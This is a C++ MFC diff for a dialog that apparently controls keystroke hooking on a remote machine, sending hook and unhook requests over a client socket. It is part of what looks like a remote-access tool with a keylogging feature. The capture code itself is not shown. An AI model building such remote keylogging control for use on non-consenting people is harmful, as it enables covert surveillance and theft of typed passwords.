@@ -7,6 +7,7 @@
 #include "afxdialogex.h"
 
 
+
 // CKeystrokeDlg dialog
 
 IMPLEMENT_DYNAMIC(CKeystrokeDlg, CDialogEx)
@@ -31,7 +32,6 @@ void CKeystrokeDlg::DoDataExchange(CDataExchange* pDX)
 BEGIN_MESSAGE_MAP(CKeystrokeDlg, CDialogEx)
 	ON_BN_CLICKED(IDC_BN_KSTR_HOOK, &CKeystrokeDlg::OnBnClickedBnKstrHook)
 	ON_BN_CLICKED(IDC_BN_KSTR_UNHK, &CKeystrokeDlg::OnBnClickedBnKstrUnhk)
-	ON_EN_CHANGE(IDC_EDIT_KEYSTROKE, &CKeystrokeDlg::OnEnChangeEditKeystroke)
 END_MESSAGE_MAP()
 
 
@@ -41,44 +41,22 @@ END_MESSAGE_MAP()
 
 void CKeystrokeDlg::OnBnClickedBnKstrHook()
 {
-	// TODO: Add your control notification handler code here
-	if (m_isHooked == FALSE)
-	{
-		m_isHooked = TRUE;
-	}
-		
+	CString msg(std::string("REQ_KSTR_HOOK").c_str());
+	((CClientApp*)AfxGetApp())->m_ClientSocket.Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());		
 }
 
 
 void CKeystrokeDlg::OnBnClickedBnKstrUnhk()
 {
-	// TODO: Add your control notification handler code here
-	if (m_isHooked == TRUE)
-	{
-		m_isHooked = FALSE;
-		//m_strAllKeystroke = "";
-	}
-		
+	CString msg(std::string("REQ_KSTR_UNHOOK").c_str());
+	((CClientApp*)AfxGetApp())->m_ClientSocket.Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
 }
-
-
-
-void CKeystrokeDlg::OnEnChangeEditKeystroke()
-{
-	// TODO:  If this is a RICHEDIT control, the control will not
-	// send this notification unless you override the CDialogEx::OnInitDialog()
-	// function and call CRichEditCtrl().SetEventMask()
-	// with the ENM_CHANGE flag ORed into the mask.
-
-	// TODO:  Add your control notification handler code here
-}
-
 
 BOOL CKeystrokeDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
+	m_isHooked = TRUE;
 
-	// TODO:  Add extra initialization here
 	// Get a pointer to the edit control
 	CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_KEYSTROKE);
 
@@ -110,4 +88,21 @@ BOOL CKeystrokeDlg::OnInitDialog()
 
 	return TRUE;  // return TRUE unless you set the focus to a control
 				  // EXCEPTION: OCX Property Pages should return FALSE
+}
+
+void CKeystrokeDlg::OnCancel()
+{
+	CString msg(std::string("REQ_KSTR_UNHOOK").c_str());
+	((CClientApp*)AfxGetApp())->m_ClientSocket.Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
+	m_isHooked = FALSE;
+	CDialogEx::OnCancel();
+}
+
+
+void CKeystrokeDlg::OnOK()
+{
+	CString msg(std::string("REQ_KSTR_UNHOOK").c_str());
+	((CClientApp*)AfxGetApp())->m_ClientSocket.Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
+	m_isHooked = FALSE;
+	CDialogEx::OnCancel();
 }
